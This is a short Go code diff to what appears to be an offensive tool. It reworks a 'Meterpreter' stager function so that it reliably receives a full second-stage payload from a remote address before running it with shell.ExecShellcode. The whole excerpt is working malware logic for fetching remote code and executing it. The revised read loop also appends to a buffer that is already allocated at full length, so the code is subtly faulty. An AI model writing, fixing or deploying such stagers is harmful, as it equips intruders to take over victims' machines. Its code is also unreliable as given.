@@ -72,7 +72,10 @@ func InteractiveShell(conn net.Conn) {
 func Meterpreter(address string) (bool, error) {
 	var (
 		stage2LengthBuf []byte = make([]byte, 4)
-		stage2LengthInt uint32
+		tmpBuf          []byte = make([]byte, 2048)
+		read            int    = 0
+		totalRead       int    = 0
+		stage2LengthInt uint32 = 0
 		conn            net.Conn
 		err             error
 	)
@@ -90,8 +93,12 @@ func Meterpreter(address string) (bool, error) {
 	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
 	stage2Buf := make([]byte, stage2LengthInt)
 
-	if _, err = conn.Read(stage2Buf); err != nil {
-		return false, err
+	for totalRead < (int)(stage2LengthInt) {
+		if read, err = conn.Read(tmpBuf); err != nil {
+			return false, err
+		}
+		totalRead += read
+		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
 	}
 
 	shell.ExecShellcode(stage2Buf)
